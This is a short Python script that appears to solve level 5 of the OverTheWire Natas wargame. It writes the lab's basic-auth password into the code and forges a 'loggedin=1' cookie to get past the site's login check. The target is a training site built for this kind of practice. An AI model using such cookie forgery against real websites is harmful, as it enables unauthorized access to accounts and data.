#!/usr/bin/env python

import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
cookies = { "loggedin" : "1" }
url = 'http://%s.natas.labs.overthewire.org' % username

response = requests.get(url, auth = (username, password), cookies = cookies)
#session = requests.Session()
#response = session.get(url, auth= (username, password))
content=response.text
#print(session.cookies['loggedin'])
print(content)

#print(re.findall('The password for natas5 is (.*)', content)[0])


